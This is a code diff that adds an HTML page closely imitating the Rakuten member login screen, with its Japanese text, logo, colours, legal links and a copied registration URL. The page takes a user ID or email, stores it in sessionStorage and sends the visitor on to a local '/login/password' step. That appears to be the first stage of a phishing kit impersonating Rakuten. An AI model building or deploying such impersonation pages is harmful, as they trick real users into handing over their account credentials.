@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ログイン - 楽天</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: "Helvetica Neue", Arial, "Hiragino Kaku Gothic ProN", "Hiragino Sans", Meiryo, sans-serif;
+            background-color: #f4f5fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            width: 500px;
+            max-width: 90vw;
+            background-color: #ffffff;
+            box-shadow: 3px 3px 10px 5px rgba(0, 0, 0, 0.2);
+            padding: 40px 50px;
+            box-sizing: border-box;
+        }
+
+        .logo {
+            margin-bottom: 40px;
+        }
+
+        .logo svg {
+            height: 32px;
+            width: auto;
+        }
+
+        .logo path {
+            fill: #bf0000;
+        }
+
+        h1 {
+            font-size: 28px;
+            font-weight: 400;
+            color: #000;
+            margin-bottom: 40px;
+            letter-spacing: 0.02em;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 8px;
+            font-weight: 400;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 14px 12px;
+            font-size: 16px;
+            border: 2px solid #ccc;
+            border-radius: 4px;
+            transition: border-color 0.2s;
+            background-color: #fff;
+        }
+
+        input[type="text"]:focus {
+            outline: none;
+            border-color: #bf0000;
+        }
+
+        .next-button {
+            width: 100%;
+            padding: 16px;
+            background-color: #bf0000;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 400;
+            cursor: pointer;
+            margin-top: 10px;
+            margin-bottom: 20px;
+            transition: background-color 0.2s;
+        }
+
+        .next-button:hover {
+            background-color: #a00000;
+        }
+
+        .next-button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+
+        .terms-text {
+            font-size: 13px;
+            color: #333;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        .terms-text a {
+            color: #0066c0;
+            text-decoration: none;
+        }
+
+        .terms-text a:hover {
+            text-decoration: underline;
+        }
+
+        .secret-mode {
+            font-size: 13px;
+            color: #333;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+
+        .secret-mode a {
+            color: #0066c0;
+            text-decoration: none;
+        }
+
+        .secret-mode a:hover {
+            text-decoration: underline;
+        }
+
+        .forgot-password {
+            display: block;
+            color: #0066c0;
+            text-decoration: none;
+            font-size: 14px;
+            margin-bottom: 40px;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .forgot-password::after {
+            content: '›';
+            margin-left: 4px;
+            font-size: 18px;
+        }
+
+        .register-section {
+            border: 2px solid #bf0000;
+            border-radius: 4px;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .register-section a {
+            color: #bf0000;
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: 400;
+        }
+
+        .register-section a:hover {
+            text-decoration: underline;
+        }
+
+        .language-selector {
+            margin-top: 40px;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .language-selector button {
+            background: none;
+            border: none;
+            color: #333;
+            font-size: 14px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 0;
+        }
+
+        .language-selector button:hover {
+            color: #0066c0;
+        }
+
+        .language-icon {
+            width: 20px;
+            height: 20px;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 30px;
+            font-size: 13px;
+        }
+
+        .footer-links a {
+            color: #333;
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .copyright {
+            text-align: center;
+            font-size: 13px;
+            color: #666;
+            padding-bottom: 20px;
+        }
+
+        .error-message {
+            color: #bf0000;
+            font-size: 13px;
+            margin-top: 5px;
+            display: none;
+        }
+
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.9);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .loading-overlay.show {
+            display: flex;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #bf0000;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @media only screen and (max-width: 560px) {
+            .container {
+                width: 100vw;
+                max-width: 100vw;
+                min-height: 100vh;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+    </div>
+
+    <div class="container">
+        <div class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 166 50" height="32" width="106.24">
+                <path d="M41.2 49.4l92.3-8H33.2l8 8zm1.3-14.3v1.2h6.2V9.1h-6.2v1.2a10 10 0 0 0-5.8-1.9c-7 0-12.4 6.4-12.4 14.3S29.6 37 36.7 37c2.3 0 4-.7 5.8-1.9zM30.7 22.7c0-4.3 2.5-7.7 6-7.7s5.9 3.4 5.9 7.7c0 4.3-2.5 7.7-5.9 7.7-3.5 0-6-3.4-6-7.7zm56 14.3c3 0 5.3-1.7 5.3-1.7v1h6.2V9.1H92v16c0 3-2.1 5.5-5.1 5.5s-5.1-2.5-5.1-5.5v-16h-6.2v16c0 6.6 4.5 11.9 11.1 11.9zm68.2-28.6c-3 0-5.3 1.7-5.3 1.7v-1h-6.2v27.2h6.2v-16c0-3 2.1-5.5 5.1-5.5s5.1 2.5 5.1 5.5v16h6.2v-16c0-6.6-4.5-11.9-11.1-11.9zM22.4 14c0-6.5-5.3-11.7-11.7-11.7H0v34h6.5V25.8h4.6L19 36.3h8.1l-9.6-12.7c3-2.1 4.9-5.6 4.9-9.6zm-11.7 5.3H6.5V8.7h4.2c2.9 0 5.3 2.4 5.3 5.3s-2.4 5.3-5.3 5.3zm92.9 8c0 6.1 4.6 9.7 9.2 9.7a13 13 0 0 0 6-1.7l-4-5.4c-.6.4-1.3.7-2.1.7-1 0-2.9-.8-2.9-3.3V15.6h5.3V9.1h-5.3V2.3h-6.2v6.8h-3.3v6.5h3.3v11.7zm-45.1-2.2l9.2 11.2h8.6L64 21.8 74.6 9.1H66l-7.5 9.5V0h-6.3v36.3h6.3V25.1zm70.6-16.7c-7.2 0-12.3 6.3-12.3 14.3 0 8.4 6.4 14.3 12.9 14.3 3.3 0 7.4-1.1 10.9-6.1l-5.5-3.2c-4.2 6.2-11.3 3.1-12.1-3.2h17.8c1.7-9.7-4.7-16.1-11.7-16.1zm-5.7 10.8c1.3-6.4 9.9-6.8 11.1 0h-11.1z"></path>
+            </svg>
+        </div>
+
+        <h1>楽天会員 ログイン</h1>
+
+        <form id="emailForm">
+            <div class="form-group">
+                <label for="username">ユーザIDまたはメールアドレス (必須)</label>
+                <input type="text" id="username" name="username" maxlength="100" required>
+                <div class="error-message" id="errorMessage">ユーザIDまたはメールアドレスを入力してください</div>
+            </div>
+
+            <button type="submit" class="next-button">次へ</button>
+
+            <div class="terms-text">
+                楽天会員<a href="https://corp.rakuten.co.jp/terms/" target="_blank">関連規約類</a>および<a href="https://privacy.rakuten.co.jp/" target="_blank">個人情報保護方針</a>（2022年3月31日改定）に同意いただいた上で、ログインしてください。
+            </div>
+
+            <div class="secret-mode">
+                ご自身の端末でない場合、<a href="https://ichiba.faq.rakuten.net/detail/000033575" target="_blank">シークレットモードを使用</a>してログインしてください。
+            </div>
+
+            <a href="#" class="forgot-password">パスワードをお忘れの方</a>
+
+            <div class="register-section">
+                <a href="https://login.account.rakuten.com/sso/register?client_id=rakuten_myrakuten_web&scope=openid&response_type=code&redirect_uri=https%3A%2F%2Fmy.rakuten.co.jp%2Fsign-in%2Fcallback&state=%40St.2.3y_Sdx39MgSHbrfYsGFRT_cYuxBsucE-.QXkCigyeQ39RnPVnero494za2t_UGsuVN7zAv_Mcf3xJHJkRyezW8gDFIt54LnqUfBRt2fuG0A40PKGaZT_ZNFizR3zE_asQh2Fkhc9w2Jh-w5cJnNAPo-Es8uLDR_NlYvbB1bsL4kcnmzbR_f4qE4ifGMHc1cMANM8h7TRYPbZuSGz13nuzExrRKVqCK32eCKBpV0Y582k8gKd1KynW6xeaDBg26yz_o5X4xPmuGQdL6qkfUYPtxO9oEUda9TOaCA0&code_challenge=ZLl_6MXeI3rDps9fdo8XGCIvepy964qmwxv1A1Y1opM&code_challenge_method=S256#/registration/1">楽天会員登録（無料）</a>
+            </div>
+
+            <div class="language-selector">
+                <button type="button">
+                    <svg class="language-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2"/>
+                        <path d="M2 12h20M12 2c2.5 2.5 4 6.5 4 10s-1.5 7.5-4 10M12 2C9.5 4.5 8 8.5 8 12s1.5 7.5 4 10" stroke="currentColor" stroke-width="2" fill="none"/>
+                    </svg>
+                    Language ›
+                </button>
+            </div>
+
+            <div class="footer-links">
+                <a href="https://ichiba.faq.rakuten.net/category/log-in-membership" target="_blank">ヘルプ</a>
+                <a href="https://privacy.rakuten.co.jp/" target="_blank">個人情報保護方針</a>
+                <a href="https://corp.rakuten.co.jp/terms/" target="_blank">会員規約</a>
+            </div>
+
+            <div class="copyright">
+                © Rakuten
+            </div>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('emailForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const emailInput = document.getElementById('username');
+            const email = emailInput.value.trim();
+            const errorMessage = document.getElementById('errorMessage');
+            
+            if (!email) {
+                errorMessage.textContent = 'ユーザIDまたはメールアドレスを入力してください';
+                errorMessage.style.display = 'block';
+                emailInput.style.borderColor = '#bf0000';
+                return;
+            }
+            
+            if (email.length < 6) {
+                errorMessage.textContent = '6文字以上で入力してください';
+                errorMessage.style.display = 'block';
+                emailInput.style.borderColor = '#bf0000';
+                return;
+            }
+            
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            const userIdRegex = /^[a-zA-Z0-9_-]{6,}$/;
+            
+            if (!emailRegex.test(email) && !userIdRegex.test(email)) {
+                errorMessage.textContent = '有効なメールアドレスまたはユーザーID（6文字以上の英数字）を入力してください';
+                errorMessage.style.display = 'block';
+                emailInput.style.borderColor = '#bf0000';
+                return;
+            }
+            
+            sessionStorage.setItem('userEmail', email);
+            window.location.href = '/login/password';
+        });
+        
+        document.getElementById('username').addEventListener('input', function() {
+            document.getElementById('errorMessage').style.display = 'none';
+            this.style.borderColor = '#ccc';
+        });
+    </script>
+</body>
+</html>
